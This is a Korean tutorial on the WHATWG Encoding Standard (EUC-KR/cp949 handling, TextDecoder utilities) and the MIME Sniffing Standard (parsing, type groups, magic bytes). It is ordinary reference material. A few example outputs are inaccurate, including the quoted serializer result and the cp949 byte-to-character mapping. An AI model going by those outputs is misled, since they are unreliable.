브라우저는 HTML 문서의 인코딩을 결정하기 위해 여러 단계를 거친다. 우선순위가 높은 것부터 낮은 것 순으로 나열한다.

#### 10.1 인코딩 결정 우선순위

```
1. BOM (Byte Order Mark)
   ↓ 없으면
2. HTTP Content-Type 헤더의 charset 매개변수
   ↓ 없으면
3. HTML 문서 내 prescan (처음 1024바이트에서 meta charset 탐색)
   ↓ 없으면
4. 부모 문서의 인코딩 (iframe 등)
   ↓ 없으면
5. 브라우저의 자동 감지 또는 기본값 (보통 windows-1252 또는 지역 설정)
```

#### 10.2 meta charset

HTML 문서 내에서 인코딩을 선언하는 방법이다.

```html
<!-- HTML5 방식 (권장) -->
<meta charset="UTF-8">

<!-- HTML4 방식 (여전히 유효) -->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
```

`<meta charset>`은 문서의 처음 1024바이트 이내에 위치해야 한다. 브라우저의 prescan 알고리즘이 이 범위만 검사하기 때문이다.

#### 10.3 Content-Type 헤더

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

```javascript
// Node.js에서 응답 인코딩 설정
const http = require('http');
http.createServer((req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.end('<h1>안녕하세요</h1>');
}).listen(3000);
```

#### 10.4 Prescan 알고리즘

브라우저는 HTML 파싱 전에 문서의 처음 1024바이트를 스캔하여 인코딩을 결정한다.

```
Prescan 절차:
1. BOM이 있는지 확인
2. 처음 1024바이트에서 다음을 검색:
   a. <meta charset="..."> 형태
   b. <meta http-equiv="content-type" content="...;charset=..."> 형태
   c. <meta content="...;charset=..." http-equiv="content-type"> 형태
3. 찾으면 해당 인코딩 사용
4. 못 찾으면 다음 단계로 진행
```

#### 10.5 인코딩 선언 모범 사례

```html
<!DOCTYPE html>
<html lang="ko">
<head>
  <!-- 반드시 첫 1024바이트 이내에 위치 -->
  <!-- title이나 다른 태그보다 먼저 선언 -->
  <meta charset="UTF-8">
  <title>페이지 제목</title>
</head>
<body>
  <p>내용</p>
</body>
</html>
```

---

### 11. 한국어 인코딩

#### 11.1 EUC-KR과 cp949 (UHC)

EUC-KR은 KS X 1001 표준에 기반한 한국어 인코딩이다. 2,350자의 한글을 포함한다.

Encoding Standard에서 `EUC-KR` 레이블은 실제로 cp949(Unified Hangul Code, 통합 완성형)를 의미한다. cp949는 EUC-KR의 상위 집합으로, 11,172자의 한글 모두를 표현할 수 있다.

```javascript
// 표준에서 EUC-KR은 cp949를 의미
const decoder = new TextDecoder('euc-kr');
// windows-949로 선언해도 동일
const decoder2 = new TextDecoder('windows-949');
// KS X 1001 관련 레이블도 동일
const decoder3 = new TextDecoder('ks_c_5601-1987');

// 모두 같은 디코더
console.log(decoder.encoding);  // "euc-kr"
console.log(decoder2.encoding); // "euc-kr"
console.log(decoder3.encoding); // "euc-kr"
```

#### 11.2 완성형과 조합형

한글 인코딩에는 두 가지 접근법이 있다.

완성형 (조합된 글자 단위 인코딩)

```
완성형: 완성된 한글 음절에 코드를 부여
- "가" = 0xB0A1
- "각" = 0xB0A2
- "간" = 0xB0A3
- KS X 1001: 2,350자 (자주 사용되는 한글만 포함)
- cp949 확장: 나머지 8,822자를 추가하여 11,172자 모두 포함
```

조합형 (자모 단위 인코딩)

```
조합형: 초성, 중성, 종성 각각에 코드를 부여하고 조합
- "한" = ㅎ + ㅏ + ㄴ
- 초성 ㅎ, 중성 ㅏ, 종성 ㄴ 각각의 코드를 조합
- 모든 한글 11,172자를 체계적으로 표현 가능
- 웹 표준에서는 사용되지 않음
```

#### 11.3 EUC-KR의 구조

```
EUC-KR (cp949) 바이트 구조:

1바이트 영역 (ASCII 호환):
  0x00~0x7F: ASCII 문자

2바이트 영역 (KS X 1001 완성형):
  첫 번째 바이트: 0x81~0xFE
  두 번째 바이트: 0x41~0xFE (단, 0x7F 제외)

  한글 영역: 0xB0A1~0xC8FE (2,350자)
  한자 영역: 0xCAA1~0xFDFE (4,888자)
  특수문자: 0xA1A1~0xACFE

2바이트 영역 (UHC/cp949 확장):
  첫 번째 바이트: 0x81~0xC6
  두 번째 바이트: 0x41~0x5A, 0x61~0x7A, 0x81~0xFE
  (KS X 1001에 없는 나머지 한글 8,822자)
```

```javascript
// EUC-KR로 인코딩된 텍스트 디코딩
const eucKr = new TextDecoder('euc-kr');

// KS X 1001에 있는 "가"
const ga = new Uint8Array([0xB0, 0xA1]);
console.log(eucKr.decode(ga)); // "가"

// cp949 확장 영역의 "갂" (KS X 1001에 없는 글자)
const gak = new Uint8Array([0x81, 0x42]);
console.log(eucKr.decode(gak)); // "갂"
```

#### 11.4 UTF-8 전환 역사

한국 웹의 인코딩 전환 과정이다.

| 시기 | 상황 |
|------|------|
| 1990년대 | 대부분의 한국 웹사이트가 EUC-KR 사용 |
| 2000년대 초반 | XML, RSS 등에서 UTF-8 사용 시작 |
| 2003년 | 한글 도메인 도입으로 국제화 인코딩 관심 증가 |
| 2005~2010 | 주요 포털(네이버, 다음 등)이 점진적으로 UTF-8 전환 |
| 2010년대 | 대부분의 새 웹사이트가 UTF-8 채택 |
| 2012년 | 네이버 메인 페이지 UTF-8 전환 |
| 현재 | 한국 웹의 대다수가 UTF-8 사용, 일부 레거시 시스템만 EUC-KR 유지 |

```javascript
// 한국어 텍스트의 인코딩별 바이트 크기 비교
const encoder = new TextEncoder(); // UTF-8

const text = '한글';
const utf8Bytes = encoder.encode(text);
console.log(`UTF-8: ${utf8Bytes.length}바이트`);  // UTF-8: 6바이트 (한글 1자 = 3바이트)

// EUC-KR에서는 한글 1자 = 2바이트 → "한글" = 4바이트
// ASCII에서는 한글 표현 불가
// UTF-16에서는 한글 1자 = 2바이트 → "한글" = 4바이트 (+ BOM 2바이트)
```

#### 11.5 한국어 인코딩 감지 전략

레거시 한국어 콘텐츠를 처리할 때의 실용적 전략이다.

```javascript
// 인코딩 자동 감지 시도 함수
function decodeKorean(bytes) {
  // 1. BOM 확인
  if (bytes[0] === 0xEF && bytes[1] === 0xBB && bytes[2] === 0xBF) {
    return new TextDecoder('utf-8').decode(bytes);
  }

  // 2. UTF-8 유효성 검사
  try {
    const text = new TextDecoder('utf-8', { fatal: true }).decode(bytes);
    return text; // 유효한 UTF-8
  } catch {
    // UTF-8이 아님
  }

  // 3. EUC-KR로 시도
  return new TextDecoder('euc-kr').decode(bytes);
}
```

---

### 12. 실용 예제

#### 12.1 파일 읽기와 인코딩 변환

```javascript
// 브라우저: File API로 파일 읽기
async function readFileWithEncoding(file, encoding = 'utf-8') {
  const buffer = await file.arrayBuffer();
  const decoder = new TextDecoder(encoding);
  return decoder.decode(buffer);
}

// 사용 예
const fileInput = document.querySelector('input[type="file"]');
fileInput.addEventListener('change', async (e) => {
  const file = e.target.files[0];

  // UTF-8 파일
  const utf8Text = await readFileWithEncoding(file, 'utf-8');

  // EUC-KR 파일
  const eucKrText = await readFileWithEncoding(file, 'euc-kr');
});
```

```javascript
// Node.js: Buffer를 사용한 인코딩 변환
const fs = require('fs');

// EUC-KR 파일을 UTF-8로 변환하여 읽기
function readEucKrFile(filePath) {
  const buffer = fs.readFileSync(filePath);
  const decoder = new TextDecoder('euc-kr');
  return decoder.decode(buffer);
}

// UTF-8로 저장
function convertToUtf8(inputPath, outputPath) {
  const text = readEucKrFile(inputPath);
  const encoder = new TextEncoder();
  const utf8Bytes = encoder.encode(text);
  fs.writeFileSync(outputPath, utf8Bytes);
}
```

#### 12.2 인코딩 변환

```javascript
// EUC-KR → UTF-8 변환 (웹 브라우저)
async function convertEucKrToUtf8(eucKrArrayBuffer) {
  // 1. EUC-KR 바이트를 문자열로 디코딩
  const decoder = new TextDecoder('euc-kr');
  const text = decoder.decode(eucKrArrayBuffer);

  // 2. 문자열을 UTF-8로 인코딩
  const encoder = new TextEncoder();
  const utf8Bytes = encoder.encode(text);

  return utf8Bytes;
}

// Shift_JIS → UTF-8 변환
function convertShiftJisToUtf8(shiftJisBuffer) {
  const decoder = new TextDecoder('shift_jis');
  const text = decoder.decode(shiftJisBuffer);
  const encoder = new TextEncoder();
  return encoder.encode(text);
}
```

#### 12.3 Base64와 인코딩

```javascript
// 문자열 → Base64 (UTF-8 경유)
function stringToBase64(str) {
  const encoder = new TextEncoder();
  const bytes = encoder.encode(str);
  // bytes를 이진 문자열로 변환
  let binary = '';
  for (const byte of bytes) {
    binary += String.fromCharCode(byte);
  }
  return btoa(binary);
}

// Base64 → 문자열 (UTF-8 경유)
function base64ToString(base64) {
  const binary = atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  const decoder = new TextDecoder('utf-8');
  return decoder.decode(bytes);
}

// 사용
const encoded = stringToBase64('안녕하세요');
console.log(encoded); // "7JWI64WV7ZWY7IS47JqU"
console.log(base64ToString(encoded)); // "안녕하세요"
```

#### 12.4 바이너리 데이터 처리

```javascript
// 바이너리 데이터와 텍스트를 혼합한 프로토콜 파싱
function parsePacket(buffer) {
  const view = new DataView(buffer);

  // 처음 4바이트: 패킷 길이 (빅 엔디안 uint32)
  const length = view.getUint32(0, false);

  // 다음 1바이트: 메시지 타입
  const type = view.getUint8(4);

  // 나머지: UTF-8 텍스트 페이로드
  const textBytes = new Uint8Array(buffer, 5);
  const decoder = new TextDecoder('utf-8');
  const payload = decoder.decode(textBytes);

  return { length, type, payload };
}

// 바이너리 프레임 생성
function createPacket(type, text) {
  const encoder = new TextEncoder();
  const textBytes = encoder.encode(text);

  const buffer = new ArrayBuffer(5 + textBytes.length);
  const view = new DataView(buffer);

  // 헤더
  view.setUint32(0, 5 + textBytes.length, false); // 패킷 길이
  view.setUint8(4, type); // 메시지 타입

  // 페이로드
  new Uint8Array(buffer, 5).set(textBytes);

  return buffer;
}
```

#### 12.5 스트림 기반 대용량 파일 처리

```javascript
// 대용량 EUC-KR 파일을 UTF-8로 스트림 변환
async function convertLargeFile(inputUrl, outputStream) {
  const response = await fetch(inputUrl);

  // EUC-KR → 문자열 스트림
  const textStream = response.body.pipeThrough(
    new TextDecoderStream('euc-kr')
  );

  // 문자열 → UTF-8 바이트 스트림
  const utf8Stream = textStream.pipeThrough(
    new TextEncoderStream()
  );

  // 출력으로 파이프
  await utf8Stream.pipeTo(outputStream);
}
```

#### 12.6 fetch와 인코딩

```javascript
// 다양한 인코딩의 페이지 가져오기
async function fetchWithEncoding(url, encoding) {
  const response = await fetch(url);

  if (encoding) {
    // 명시적 인코딩 지정
    const buffer = await response.arrayBuffer();
    return new TextDecoder(encoding).decode(buffer);
  }

  // Content-Type에서 인코딩 감지
  const contentType = response.headers.get('Content-Type') || '';
  const charsetMatch = contentType.match(/charset=([^\s;]+)/i);
  const detectedEncoding = charsetMatch ? charsetMatch[1] : 'utf-8';

  const buffer = await response.arrayBuffer();
  return new TextDecoder(detectedEncoding).decode(buffer);
}

// 사용
const text = await fetchWithEncoding('https://example.kr/legacy', 'euc-kr');
```

#### 12.7 Hex 덤프 유틸리티

```javascript
// 바이트 시퀀스를 읽기 쉬운 형태로 출력
function hexDump(bytes) {
  const arr = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  const lines = [];

  for (let i = 0; i < arr.length; i += 16) {
    const hex = [];
    const ascii = [];

    for (let j = 0; j < 16; j++) {
      if (i + j < arr.length) {
        hex.push(arr[i + j].toString(16).padStart(2, '0'));
        const ch = arr[i + j];
        ascii.push(ch >= 0x20 && ch <= 0x7E ? String.fromCharCode(ch) : '.');
      } else {
        hex.push('  ');
        ascii.push(' ');
      }
    }

    const offset = i.toString(16).padStart(8, '0');
    lines.push(`${offset}  ${hex.slice(0,8).join(' ')}  ${hex.slice(8).join(' ')}  |${ascii.join('')}|`);
  }

  return lines.join('\n');
}

// 사용
const encoder = new TextEncoder();
console.log(hexDump(encoder.encode('Hello, 세계!')));
// 00000000  48 65 6c 6c 6f 2c 20 ec  84 b8 ea b3 84 21     |Hello, ......!|
```

#### 12.8 인코딩 감지 및 변환 클래스

```javascript
// 실전용 인코딩 유틸리티 클래스
class EncodingHelper {
  // 지원되는 인코딩인지 확인
  static isSupported(encoding) {
    try {
      new TextDecoder(encoding);
      return true;
    } catch {
      return false;
    }
  }

  // 정규 인코딩 이름 가져오기
  static getCanonicalName(label) {
    try {
      return new TextDecoder(label).encoding;
    } catch {
      return null;
    }
  }

  // UTF-8 유효성 검사
  static isValidUTF8(bytes) {
    try {
      new TextDecoder('utf-8', { fatal: true }).decode(bytes);
      return true;
    } catch {
      return false;
    }
  }

  // 바이트 시퀀스에서 BOM 감지
  static detectBOM(bytes) {
    if (bytes[0] === 0xEF && bytes[1] === 0xBB && bytes[2] === 0xBF) {
      return { encoding: 'utf-8', bomLength: 3 };
    }
    if (bytes[0] === 0xFE && bytes[1] === 0xFF) {
      return { encoding: 'utf-16be', bomLength: 2 };
    }
    if (bytes[0] === 0xFF && bytes[1] === 0xFE) {
      return { encoding: 'utf-16le', bomLength: 2 };
    }
    return null;
  }

  // 인코딩 변환
  static convert(bytes, fromEncoding, toEncoding = 'utf-8') {
    const text = new TextDecoder(fromEncoding).decode(bytes);
    if (toEncoding === 'utf-8') {
      return new TextEncoder().encode(text);
    }
    throw new Error('TextEncoder는 UTF-8만 지원합니다');
  }
}

// 사용
console.log(EncodingHelper.isSupported('euc-kr'));         // true
console.log(EncodingHelper.getCanonicalName('latin1'));    // "windows-1252"
console.log(EncodingHelper.getCanonicalName('windows-949')); // "euc-kr"
```

---

### 참고 자료

- [WHATWG Encoding Standard](https://encoding.spec.whatwg.org/)
- [MDN - TextEncoder](https://developer.mozilla.org/en-US/docs/Web/API/TextEncoder)
- [MDN - TextDecoder](https://developer.mozilla.org/en-US/docs/Web/API/TextDecoder)
- [MDN - TextEncoderStream](https://developer.mozilla.org/en-US/docs/Web/API/TextEncoderStream)
- [MDN - TextDecoderStream](https://developer.mozilla.org/en-US/docs/Web/API/TextDecoderStream)
- [Unicode 공식 사이트](https://unicode.org/)
- [W3C - Character encodings for beginners](https://www.w3.org/International/questions/qa-what-is-encoding)

---

## MIME Sniffing Standard 상세 가이드

### 목차

1. [개요](#1-개요)
2. [MIME 타입 구조](#2-mime-타입-구조)
3. [MIME 타입 파싱](#3-mime-타입-파싱)
4. [MIME 타입 직렬화](#4-mime-타입-직렬화)
5. [MIME 타입 그룹](#5-mime-타입-그룹)
6. [리소스 타입 결정 알고리즘](#6-리소스-타입-결정-알고리즘)
7. [바이트 패턴 매칭](#7-바이트-패턴-매칭)
8. [Sniffing Context](#8-sniffing-context)
9. [보안 고려사항](#9-보안-고려사항)
10. [Apache Bug 호환성](#10-apache-bug-호환성)
11. [실용 예제](#11-실용-예제)
12. [브라우저별 동작](#12-브라우저별-동작)
13. [참고 자료](#13-참고-자료)

---

### 1. 개요

#### MIME 스니핑이란

MIME Sniffing Standard는 WHATWG에서 관리하는 Living Standard로, 웹 브라우저가 리소스의 MIME 타입을 결정하는 알고리즘을 정의한다. 서버가 `Content-Type` 헤더를 통해 제공하는 타입 정보가 없거나 부정확한 경우, 브라우저는 리소스의 실제 바이트를 검사하여 타입을 추론한다. 이 과정을 MIME 스니핑(MIME sniffing) 또는 콘텐츠 타입 스니핑(content type sniffing)이라 한다.

```
[MIME 스니핑의 기본 흐름]

서버 응답 수신
    ↓
Content-Type 헤더 확인
    │
    ├── Content-Type 존재
    │   ↓
    │   supplied type으로 사용
    │   ↓
    │   sniffing context에 따라 검증/오버라이드
    │
    └── Content-Type 없음
        ↓
        리소스 바이트 검사 (magic bytes)
        ↓
        computed type 결정
```

#### 왜 MIME 스니핑이 필요한가

1. 서버 설정 오류: 많은 서버가 잘못된 `Content-Type`을 반환
2. Content-Type 누락: 일부 서버가 `Content-Type` 헤더를 생략
3. 레거시 호환성: 오래된 웹 서버의 잘못된 설정과 호환
4. 사용자 경험: 타입이 잘못되어도 리소스를 올바르게 처리

```
[실제 문제 예시]

1. 서버가 JavaScript를 text/plain으로 전송
   Content-Type: text/plain
   실제 내용: function hello() { ... }
   → 스니핑 없으면 스크립트가 실행되지 않음

2. 서버가 이미지에 Content-Type을 누락
   Content-Type: (없음)
   실제 내용: 0x89 0x50 0x4E 0x47 ... (PNG 매직 바이트)
   → 스니핑으로 image/png 감지

3. 서버가 HTML을 application/octet-stream으로 전송
   Content-Type: application/octet-stream
   실제 내용: <html><body>Hello</body></html>
   → 보안 위험! (스니핑이 XSS를 유발할 수 있음)
```

---

### 2. MIME 타입 구조

#### 2.1 MIME 타입의 구성 요소

```
MIME 타입 (Media Type) 구조:

type "/" subtype *( ";" parameter )

예시: text/html; charset=utf-8

┌─────────────────────────────────────────────┐
│  type    /   subtype   ;  parameter         │
│  ────       ────────      ─────────         │
│  text   /   html      ;  charset=utf-8      │
│                                             │
│  type: 주 타입 (text, image, audio, etc.)    │
│  subtype: 부 타입 (html, png, mp3, etc.)     │
│  parameter: 추가 매개변수 (key=value)        │
└─────────────────────────────────────────────┘
```

#### 2.2 MIME 타입의 주요 속성

| 속성 | 설명 | 예시 |
|------|------|------|
| type | 주 타입 | `text`, `image`, `audio`, `video`, `application`, `font`, `multipart` |
| subtype | 부 타입 | `html`, `json`, `png`, `mp4`, `javascript` |
| essence | type/subtype 조합 | `text/html`, `image/png` |
| parameters | 추가 매개변수 맵 | `charset=utf-8`, `boundary=----` |

#### 2.3 MIME 타입 예시

```
[일반적인 MIME 타입]

텍스트:
  text/html                    HTML 문서
  text/plain                   일반 텍스트
  text/css                     CSS 스타일시트
  text/javascript              JavaScript (표준)
  text/xml                     XML 문서

이미지:
  image/png                    PNG 이미지
  image/jpeg                   JPEG 이미지
  image/gif                    GIF 이미지
  image/svg+xml                SVG 이미지
  image/webp                   WebP 이미지
  image/avif                   AVIF 이미지

오디오/비디오:
  audio/mpeg                   MP3 오디오
  audio/ogg                    Ogg 오디오
  audio/wav                    WAV 오디오
  video/mp4                    MP4 비디오
  video/webm                   WebM 비디오

응용 프로그램:
  application/json             JSON 데이터
  application/xml              XML 데이터
  application/pdf              PDF 문서
  application/zip              ZIP 압축 파일
  application/octet-stream     바이너리 데이터 (기본)
  application/javascript       JavaScript (deprecated, text/javascript 사용)

폰트:
  font/woff                    WOFF 폰트
  font/woff2                   WOFF2 폰트
  font/ttf                     TrueType 폰트
  font/otf                     OpenType 폰트

멀티파트:
  multipart/form-data          폼 데이터 (파일 업로드)
  multipart/byteranges         바이트 범위 응답
```

#### 2.4 매개변수(Parameters)

```
[MIME 타입 매개변수]

text/html; charset=utf-8
         ╰──────────────── charset 매개변수

multipart/form-data; boundary=----WebKitFormBoundary
                     ╰──────────────────────────── boundary 매개변수

text/plain; charset=iso-8859-1
           ╰──────────────────── charset 매개변수

매개변수 규칙:
- 이름은 대소문자를 구분하지 않음 (charset = Charset = CHARSET)
- 값은 따옴표로 감쌀 수 있음 (charset="utf-8")
- 같은 이름의 매개변수는 하나만 허용
- 알 수 없는 매개변수는 무시됨
```

---

### 3. MIME 타입 파싱

#### 3.1 파싱 알고리즘 개요

```
[MIME 타입 파싱 알고리즘]

입력: "text/html; charset=utf-8"

단계 1: 선행 HTTP 공백 제거
         "text/html; charset=utf-8"

단계 2: type 추출 (첫 번째 "/" 이전)
         type = "text"

단계 3: type 유효성 검사
         ├── 빈 문자열이면 실패
         └── HTTP 토큰 코드 포인트가 아닌 문자가 있으면 실패

단계 4: "/" 건너뛰기

단계 5: subtype 추출 (";" 이전까지)
         subtype = "html"

단계 6: 후행 HTTP 공백 제거
         subtype = "html"

단계 7: MIME 타입 레코드 생성
         { type: "text", subtype: "html", parameters: {} }

단계 8: 매개변수 파싱 (반복)
         "charset=utf-8" 파싱
         → parameters: { "charset": "utf-8" }

결과: { type: "text", subtype: "html", parameters: { charset: "utf-8" } }
```

#### 3.2 매개변수 파싱 상세

```
[매개변수 파싱 알고리즘]

입력: "; charset=utf-8; boundary=----"

반복:
  1. ";" 건너뛰기
  2. 공백 건너뛰기
  3. 매개변수 이름 추출 ("=" 이전까지)
     name = "charset"
  4. 소문자로 변환
     name = "charset"
  5. "=" 건너뛰기
  6. 값 추출:
     ├── 따옴표로 시작하면 → 따옴표 문자열 파싱
     │   "utf-8" → utf-8
     └── 그 외 → ";" 이전까지 추출
         utf-8
  7. 이미 같은 이름의 매개변수가 있으면 무시 (첫 번째 값 유지)
  8. 매개변수 맵에 추가
     parameters["charset"] = "utf-8"
```

#### 3.3 JavaScript에서의 MIME 타입 파싱

```javascript
// 간단한 MIME 타입 파서 구현
function parseMIMEType(input) {
    // 1. 앞뒤 공백 제거
    input = input.trim();

    // 2. type 추출
    const slashIndex = input.indexOf('/');
    if (slashIndex === -1) return null;

    const type = input.substring(0, slashIndex).trim().toLowerCase();
    if (!type) return null;

    // 3. subtype 및 parameters 추출
    const rest = input.substring(slashIndex + 1);
    const semicolonIndex = rest.indexOf(';');

    let subtype, paramString;
    if (semicolonIndex === -1) {
        subtype = rest.trim().toLowerCase();
        paramString = '';
    } else {
        subtype = rest.substring(0, semicolonIndex).trim().toLowerCase();
        paramString = rest.substring(semicolonIndex);
    }

    if (!subtype) return null;

    // 4. 매개변수 파싱
    const parameters = new Map();
    const paramRegex = /;\s*([^=]+)=(?:"([^"]*)"|([^;]*))/g;
    let match;
    while ((match = paramRegex.exec(paramString)) !== null) {
        const name = match[1].trim().toLowerCase();
        const value = match[2] !== undefined ? match[2] : match[3].trim();
        if (!parameters.has(name)) {
            parameters.set(name, value);
        }
    }

    return {
        type,
        subtype,
        essence: `${type}/${subtype}`,
        parameters
    };
}

// 사용 예시
const mime = parseMIMEType('Text/HTML; charset=utf-8; charset=iso-8859-1');
console.log(mime);
// {
//   type: "text",
//   subtype: "html",
//   essence: "text/html",
//   parameters: Map { "charset" => "utf-8" }
//   // 두 번째 charset은 무시됨
// }
```

---

### 4. MIME 타입 직렬화

#### 4.1 직렬화 알고리즘

```
[MIME 타입 직렬화 알고리즘]

입력: { type: "text", subtype: "html", parameters: { charset: "utf-8" } }

단계 1: essence 생성
         "text/html"

단계 2: 매개변수 직렬화 (각 매개변수에 대해)
         ";charset=utf-8"

         값에 특수 문자가 포함되면 따옴표 사용:
         ";boundary=\"----boundary----\""

결과: "text/html;charset=utf-8"
```

#### 4.2 직렬화 규칙

```javascript
function serializeMIMEType(mimeType) {
    // 1. essence
    let result = `${mimeType.type}/${mimeType.subtype}`;

    // 2. 매개변수
    for (const [name, value] of mimeType.parameters) {
        result += `;${name}=`;

        // 값에 따옴표가 필요한지 확인
        if (value === '' || /[^\x21-\x7E]|[";\\]/.test(value)) {
            // 따옴표로 감싸기
            const escaped = value.replace(/([\\"])/g, '\\$1');
            result += `"${escaped}"`;
        } else {
            result += value;
        }
    }

    return result;
}

// 예시
console.log(serializeMIMEType({
    type: 'text',
    subtype: 'html',
    parameters: new Map([['charset', 'utf-8']])
}));
// "text/html;charset=utf-8"

console.log(serializeMIMEType({
    type: 'multipart',
    subtype: 'form-data',
    parameters: new Map([['boundary', '----=_Part_123']])
}));
// "multipart/form-data;boundary=\"----=_Part_123\""
```

---

### 5. MIME 타입 그룹

MIME Sniffing Standard는 여러 MIME 타입 그룹을 정의한다.

#### 5.1 Image MIME Type

```
[이미지 MIME 타입]

image/png
image/jpeg (image/jpg 아님!)
image/gif
image/bmp
image/webp
image/avif
image/svg+xml (XML 기반 → 스크립트 실행 가능, 보안 주의)
image/x-icon (파비콘)
image/vnd.microsoft.icon
```

#### 5.2 Audio/Video MIME Type

```
[오디오 MIME 타입]
audio/basic          AU/SND 오디오
audio/aiff           AIFF 오디오
audio/mpeg           MP3 오디오
audio/midi           MIDI 오디오
audio/ogg            Ogg Vorbis 오디오
audio/wav            WAV 오디오
audio/wave           WAV 오디오 (별칭)
audio/webm           WebM 오디오
audio/flac           FLAC 오디오

[비디오 MIME 타입]
video/avi            AVI 비디오
video/mp4            MP4 비디오
video/mpeg           MPEG 비디오
video/ogg            Ogg Theora 비디오
video/webm           WebM 비디오
```

#### 5.3 Font MIME Type

```
[폰트 MIME 타입]
font/collection      폰트 컬렉션
font/otf             OpenType 폰트
font/sfnt            SFNT 폰트
font/ttf             TrueType 폰트
font/woff            WOFF 폰트
font/woff2           WOFF2 폰트
```

#### 5.4 Archive MIME Type

```
[아카이브 MIME 타입]
application/x-rar-compressed    RAR 압축
application/zip                 ZIP 압축
application/x-gzip              GZIP 압축
```

#### 5.5 XML MIME Type

```
[XML MIME 타입 판별 규칙]

type이 "text"이고 subtype이 "xml"로 끝나면 XML
또는 type이 "application"이고 subtype이 "xml"로 끝나면 XML

예시:
text/xml              XML
application/xml       XML
application/xhtml+xml XML (XHTML)
application/rss+xml   XML (RSS)
application/atom+xml  XML (Atom)
image/svg+xml         XML (SVG)
application/mathml+xml XML (MathML)
```

#### 5.6 HTML MIME Type

```
[HTML MIME 타입]
text/html
```

#### 5.7 Scriptable MIME Type

```
[스크립트 실행 가능한 MIME 타입]

다음 MIME 타입은 스크립트가 실행될 수 있어 보안 주의 필요:
- text/html               (인라인 스크립트)
- application/xhtml+xml   (인라인 스크립트)
- image/svg+xml           (인라인 스크립트!)
- application/xml         (XSLT 등)
- text/xml                (XSLT 등)
- application/pdf         (JavaScript 포함 가능)
```

#### 5.8 JavaScript MIME Type

```
[JavaScript MIME 타입]

표준:
text/javascript         ← 공식 MIME 타입 (RFC 4329, WHATWG)

레거시 (여전히 인식됨):
application/javascript
application/ecmascript
application/x-ecmascript
application/x-javascript
text/ecmascript
text/javascript1.0
text/javascript1.1
text/javascript1.2
text/javascript1.3
text/javascript1.4
text/javascript1.5
text/jscript
text/livescript
text/x-ecmascript
text/x-javascript

참고: <script> 요소의 type 속성에서는
"module"도 유효한 JavaScript 타입
```

#### 5.9 JSON MIME Type

```
[JSON MIME 타입]
application/json       표준 JSON
text/json              (비표준이지만 인식됨)
*/*+json               subtype이 "+json"으로 끝나는 모든 타입
                       예: application/vnd.api+json
                           application/geo+json
                           application/ld+json
```

#### 5.10 ZIP-based MIME Type

```
[ZIP 기반 MIME 타입]
application/zip                     ZIP
application/x-gzip                  GZIP
application/x-rar-compressed        RAR

ZIP 기반 포맷:
application/vnd.openxmlformats-officedocument.*  Office 문서 (docx, xlsx, pptx)
application/epub+zip                EPUB 전자책
application/java-archive            JAR (Java)
application/vnd.android.package-archive  APK (Android)
```

---

### 6. 리소스 타입 결정 알고리즘

#### 6.1 전체 알고리즘 흐름

```
[리소스 타입 결정 알고리즘]

입력:
  - supplied type (Content-Type 헤더에서 파싱한 MIME 타입)
  - resource header (HTTP 응답 헤더)
  - resource body (응답 본문의 처음 N 바이트)
  - sniffing context (리소스가 사용되는 맥락)
  - no-sniff flag (X-Content-Type-Options: nosniff)

┌──────────────────────────────────────┐
│      supplied type 존재?             │
├──────────┬───────────────────────────┤
│   YES    │          NO              │
│          │                          │
│  nosniff │   바이트 패턴 매칭으로    │
│  설정?   │   타입 추론              │
│  ┌───┐   │                          │
│  │YES│   │   결과: computed type     │
│  │   │   │                          │
│  │ supplied type                    │
│  │ 그대로 사용                      │
│  │   │   │                          │
│  └───┘   │                          │
│  ┌───┐   │                          │
│  │NO │   │                          │
│  │   │   │                          │
│  │ sniffing context에              │
│  │ 따른 검증/오버라이드             │
│  │   │   │                          │
│  └───┘   │                          │
└──────────┴───────────────────────────┘

결과: computed MIME type
```

#### 6.2 상세 알고리즘

```
[단계별 알고리즘]

1. supplied type 확인
   └── Content-Type 헤더 파싱 → supplied MIME type

2. nosniff 확인
   └── X-Content-Type-Options: nosniff 헤더가 있으면
       └── supplied type을 그대로 사용 (스니핑 금지)
       └── 단, 스크립트/스타일 컨텍스트에서는 추가 검증

3. sniffing context에 따른 분기:
   ├── browsing context → HTML/XML/기타 감지
   ├── image context → 이미지 타입 감지
   ├── audio/video context → 미디어 타입 감지
   ├── plugin context → 플러그인 타입 감지
   ├── style context → CSS 감지
   ├── script context → JavaScript 감지
   ├── font context → 폰트 타입 감지
   └── (기타) → 범용 스니핑

4. 바이트 패턴 매칭 수행

5. 결과 반환: computed MIME type
```

#### 6.3 Unknown Type 스니핑

supplied type이 없거나 `application/octet-stream`일 때 사용되는 알고리즘이다.

```
[Unknown Type 스니핑 순서]

1. 이미지 타입 패턴 매칭
   └── PNG, JPEG, GIF, BMP, WebP, ICO 등

2. 오디오/비디오 타입 패턴 매칭
   └── MP4, WebM, Ogg, MP3, WAV 등

3. 아카이브 타입 패턴 매칭
   └── ZIP, GZIP, RAR 등

4. 폰트 타입 패턴 매칭
   └── WOFF, WOFF2, TrueType, OpenType 등

5. 텍스트/바이너리 판별
   └── 바이트 값 분석으로 텍스트인지 바이너리인지 결정

6. 기본값
   └── application/octet-stream
```

---

### 7. 바이트 패턴 매칭

#### 7.1 매직 바이트(Magic Bytes) 개념

매직 바이트는 파일의 시작 부분에 위치하는 고유한 바이트 시퀀스로, 파일 포맷을 식별하는 데 사용된다.

```
[주요 파일 포맷의 매직 바이트]

이미지:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 매직 바이트 (ASCII) │
├──────────┼─────────────────────────────┼────────────────────┤
│ PNG      │ 89 50 4E 47 0D 0A 1A 0A    │ .PNG....           │
│ JPEG     │ FF D8 FF                    │ ...                │
│ GIF87a   │ 47 49 46 38 37 61          │ GIF87a             │
│ GIF89a   │ 47 49 46 38 39 61          │ GIF89a             │
│ BMP      │ 42 4D                       │ BM                 │
│ WebP     │ 52 49 46 46 xx xx xx xx    │ RIFF....           │
│          │ 57 45 42 50 56 50          │ WEBPVP             │
│ ICO      │ 00 00 01 00                │ ....               │
│ CUR      │ 00 00 02 00                │ ....               │
└──────────┴─────────────────────────────┴────────────────────┘

